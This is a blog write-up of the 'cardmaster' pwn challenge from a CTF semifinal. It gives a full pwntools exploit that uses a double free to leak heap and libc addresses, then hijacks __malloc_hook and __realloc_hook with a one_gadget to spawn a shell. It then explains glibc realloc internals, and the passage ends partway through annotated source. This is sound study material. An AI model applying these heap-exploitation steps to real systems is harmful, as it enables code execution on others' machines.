<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          网鼎杯半决赛 - C12en
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>C12EN</span>
  </a>
</div>
    <div id="menu" class="book-menu hide">
  
</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <h1 id="cardmaster"><a href="#cardmaster" class="headerlink" title="cardmaster"></a>cardmaster</h1><h2 id="赛时wp"><a href="#赛时wp" class="headerlink" title="赛时wp"></a>赛时wp</h2><p>超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉<br>不过说实话这题就是纯靠动调猜出来的<br>主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了  主要的时间卡在了泄露libc这一步<br>拿到libc地址后 就是想办法覆盖输出函数指针了  但是试了很久都没找到办法像刚才一样来构造double free 最后试了出来 利用realloc来把0x30的chunk放到tcachebin中 然后调用初始化函数就可以申请出来两个0x30的chunk  然后edit的时候 就可以进入malloc那个分之  就能把0x30的chunk申请出来了 而且这个chunk还是可以自定义地址的 然后就是打malloc_hook了  三个ogg的条件正常都没有办法实现 这里用realloc和malloc相结合的办法可以打通</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line">#io = remote(&quot;83.43.93.13&quot;,15000)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def init_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">def edit_card(count,number,level,payload):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line">    io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">    io.sendline(str(number))</span><br><span class="line">    io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">    io.sendline(str(level))</span><br><span class="line">    io.recvuntil(&quot;new suite set:&quot;)</span><br><span class="line">    io.send(payload)</span><br><span class="line">def shuffle_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">def show_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line">def get_info():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)</span><br><span class="line">edit_card(0,1,100,&quot;2\n&quot;)</span><br><span class="line">io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">io.sendline(str(0))</span><br><span class="line">io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">io.sendline(str(1))</span><br><span class="line">io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">io.sendline(str(100))</span><br><span class="line">io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;2&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)</span><br><span class="line">io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">io.sendline(str(0))</span><br><span class="line">io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">io.sendline(str(1))</span><br><span class="line">io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">io.sendline(str(100))</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_info()</span><br><span class="line">io.recvuntil(&quot;suit chara set:&quot;)</span><br><span class="line">heap_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">success(&quot;heap_addr :&quot;+hex(heap_addr))</span><br><span class="line">edit_card(300,0,100,&quot;\xa0&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">edit_card(11,0,100,&quot;\xa0&quot;)</span><br><span class="line"># pause()</span><br><span class="line">edit_card(11,0,100,p64(heap_addr-0x3c8))</span><br><span class="line">edit_card(1,1,100,&quot;\xa0&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)</span><br><span class="line">edit_card(1,1,100,&quot;a&quot;)</span><br><span class="line"># pause()</span><br><span class="line">init_card()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)</span><br><span class="line">edit_card(2,0,100,p64(heap_addr-0x640+0xa30))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xB10)&#x27;)</span><br><span class="line">get_info()</span><br><span class="line">io.recvuntil(&quot;suit chara set:&quot;)</span><br><span class="line">libc_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x3ebca0</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line"># # pause()</span><br><span class="line"></span><br><span class="line">edit_card(8,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(12,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(1,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(8,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(1,0,100,&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">realloc_hook = libc_addr + libc.sym[&#x27;__realloc_hook&#x27;]</span><br><span class="line">onegadget_addr = libc_addr + 0x10a38c</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">edit_card(8,0,100,p64(realloc_hook-0x10))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)</span><br><span class="line">init_card()</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">realloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]</span><br><span class="line">edit_card(8,0,100,p64(0)*2+p64(onegadget_addr)+p64(realloc_addr+0x6))</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)</span><br><span class="line">init_card()</span><br><span class="line"># pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="后记-realloc详解"><a href="#后记-realloc详解" class="headerlink" title="后记 realloc详解"></a>后记 realloc详解</h2><p>专门研究了一下realloc 发现还有平时不知道的很多用法<br>realloc函数主要用于重新分配内存空间 可以调整已分配的内存空间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *realloc(void *ptr, size_t size)</span><br></pre></td></tr></table></figure>
<p>ptr指向需要重分配的chunk指针  size表示的需要分配的大小<br>来看看正常情况下的realloc如何运作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//gcc -o test -g ./test.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 0, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    char *ptr = malloc(0x30);</span><br><span class="line">    realloc(ptr,0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行realloc之前的ptr如下图所示<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png" alt="image.png"><br>执行之后 原先的chunk就重新分配成了0x20 剩下的0x20被释放进入bin中<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png" alt="image.png"><br>这里注意的是 虽然重分配的大小是0x10 按理来说0x30的chunk分配掉0x10 那剩余的实际大小应该是0x20 但是最终两个chunk的实际大小都是0x10 是为了考虑到不破坏原有的堆结构<br>此时如果把realloc函数的ptr参数修改为0 来看看会是什么效果<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png" alt="image.png"><br>由于没有需要重分配的chunk 所以这里直接申请了一个新的chunk<br>如果把realloc函数的size参数修改为0<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png" alt="image.png"><br>则会直接把chunk释放进入bin中<br>如果size的大小大于chunk原本的大小呢<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png" alt="image.png"><br>则会直接扩大chunk的size<br>如果chunk1后面再跟一个chunk2来固定大小呢 这个时候chunk1没法直接向高地址扩大<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png" alt="image.png"><br>可以看到取而代之的办法就是直接释放chunk1 然后重新申请一个满足size的chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//gcc -o test -g ./test.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 0, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    char *ptr = malloc(0x30);</span><br><span class="line">    char *ptr1 = malloc(0x30);</span><br><span class="line">    char *ptr2 = malloc(0x10);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    realloc(ptr,0x30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里猜测realloc重分配的逻辑是先释放再申请 这里先释放一个0x30大小的chunk 再进行realloc 看看重新分配后的指针是指向哪一个chunk<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png" alt="image.png"><br>依然指向的是chunk0<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png" alt="image.png"><br>和设想的有点不一样 这里去查看下realloc的注释<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png" alt="image.png"><br>按照源码所说 当重分配的size大于原有的size时 会采用malloc-copy-free的操作序列 也就是先申请满足大小的chunk 再转移数据 最后释放原来的chunk<br>但是上面我们已经实验过 当tcachebin中存在满足大小的chunk时 他也不会去申请<br>哪怕把tcachebin换成unsortedbin也是同理<br>那还是得根据realloc的源代码来查看一下详细的逻辑<br>(以下源码版本为glibc2.35 中文注释为我所记)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">void *</span><br><span class="line">__libc_realloc (void *oldmem, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         /* padded request size */</span><br><span class="line"></span><br><span class="line">  void *newp;             /* chunk to return */</span><br><span class="line"></span><br><span class="line">  if (!__malloc_initialized)   //检测堆是否初始化</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"></span><br><span class="line">#if REALLOC_ZERO_BYTES_FREES  //这个的值默认为1 当bytes为0且指针不为空时 realloc相当于free函数</span><br><span class="line">  if (bytes == 0 &amp;&amp; oldmem != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); return 0;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /* realloc of null is supposed to be same as malloc */</span><br><span class="line">  if (oldmem == 0)   //当指针为空时 realloc相当于malloc函数</span><br><span class="line">    return __libc_malloc (bytes);</span><br><span class="line"></span><br><span class="line">  /* Perform a quick check to ensure that the pointer&#x27;s tag matches the</span><br><span class="line">     memory&#x27;s tag.  */</span><br><span class="line">  if (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(volatile char*) oldmem;</span><br><span class="line"></span><br><span class="line">  /* chunk corresponding to oldmem */   //获取内存块指针以及内存块大小</span><br><span class="line">  const mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  /* its size */</span><br><span class="line">  const INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))  //检测是否通过mmap方式分配的内存  malloc函数申请的内存空间是由brk得到的</span><br><span class="line">    ar_ptr = NULL;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line">      ar_ptr = arena_for_chunk (oldp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* Little security check which won&#x27;t hurt performance: the allocator</span><br><span class="line">     never wrapps around at the end of the address space.  Therefore</span><br><span class="line">     we can exclude some size values which might appear here by</span><br><span class="line">     accident or by &quot;design&quot; from some intruder.  */</span><br><span class="line">  if ((__builtin_expect ((uintptr_t) oldp &gt; (uintptr_t) -oldsize, 0)   //检查内存块大小是否小于零以及指针是否对齐</span><br><span class="line">       || __builtin_expect (misaligned_chunk (oldp), 0)))</span><br><span class="line">      malloc_printerr (&quot;realloc(): invalid pointer&quot;);</span><br><span class="line"></span><br><span class="line">  if (!checked_request2size (bytes, &amp;nb))   //检查申请的bytes大小</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))</span><br><span class="line">    &#123;</span><br><span class="line">      void *newmem;</span><br><span class="line"></span><br><span class="line">#if HAVE_MREMAP  //默认为0 作用是为1时让realloc使用mremap来重分配大chunk</span><br><span class="line">      newp = mremap_chunk (oldp, nb);</span><br><span class="line">      if (newp)</span><br><span class="line">	&#123;</span><br><span class="line">	  void *newmem = chunk2mem_tag (newp);</span><br><span class="line">	  /* Give the new block a different tag.  This helps to ensure</span><br><span class="line">	     that stale handles to the previous mapping are not</span><br><span class="line">	     reused.  There&#x27;s a performance hit for both us and the</span><br><span class="line">	     caller for doing this, so we might want to</span><br><span class="line">	     reconsider.  */</span><br><span class="line">	  return tag_new_usable (newmem);</span><br><span class="line">	&#125;</span><br><span class="line">#endif</span><br><span class="line">      /* Note the extra SIZE_SZ overhead. */</span><br><span class="line">      if (oldsize - SIZE_SZ &gt;= nb)   //SIZE_SZ表示chunk的元数据 如果chunk大小大于bytes 就直接返回chunk指针</span><br><span class="line">        return oldmem;                         /* do nothing */</span><br><span class="line"></span><br><span class="line">      /* Must alloc, copy, free. */</span><br><span class="line">      newmem = __libc_malloc (bytes); //这里就是比较关键的逻辑了 如果原有的chunk空间不够重分配 那么就调用malloc(bytes) 然后把旧chunk的内容copy到新chunk</span><br><span class="line">      if (newmem == 0)</span><br><span class="line">        return 0;              /* propagate failure */</span><br><span class="line"></span><br><span class="line">      memcpy (newmem, oldmem, oldsize - CHUNK_HDR_SZ);</span><br><span class="line">      munmap_chunk (oldp);  //释放旧chunk</span><br><span class="line">      return newmem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (SINGLE_THREAD_P)  //单线程情况下的重分配</span><br><span class="line">    &#123;</span><br><span class="line">      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line">      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">	      ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">      return newp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  //多线程</span><br><span class="line">  __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line">  </span><br><span class="line">  //内存分配失败时的异常处理</span><br><span class="line">  if (newp == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try harder to allocate memory in other arenas.  */</span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      if (newp != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">	  size_t sz = memsize (oldp);</span><br><span class="line">	  memcpy (newp, oldmem, sz);</span><br><span class="line">	  (void) tag_region (chunk2mem (oldp), sz);</span><br><span class="line">          _int_free (ar_ptr, oldp, 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  return newp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点关注的部分就是malloc-copy-free这个流程了 当oldp的size不满足bytes的时候 就会触发 但是我们之前的实验却没有成功 不过因为libc_realloc函数中的mcf流程只存在于if (chunk_is_mmapped (oldp))这个分支中 需要chunk由mmap分配的才行 所以接下来需要接着分析int_realloc函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">_int_realloc (mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,</span><br><span class="line">	     INTERNAL_SIZE_T nb)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr        newp;            /* chunk to return */</span><br><span class="line">  INTERNAL_SIZE_T  newsize;         /* its size */</span><br><span class="line">  void*          newmem;          /* corresponding user mem */</span><br><span class="line"></span><br><span class="line">  mchunkptr        next;            /* next contiguous chunk after oldp */</span><br><span class="line"></span><br><span class="line">  mchunkptr        remainder;       /* extra space at end of newp */</span><br><span class="line">  unsigned long    remainder_size;  /* its size */</span><br><span class="line"></span><br><span class="line">  /* oldmem size */</span><br><span class="line">  if (__builtin_expect (chunksize_nomask (oldp) &lt;= CHUNK_HDR_SZ, 0)  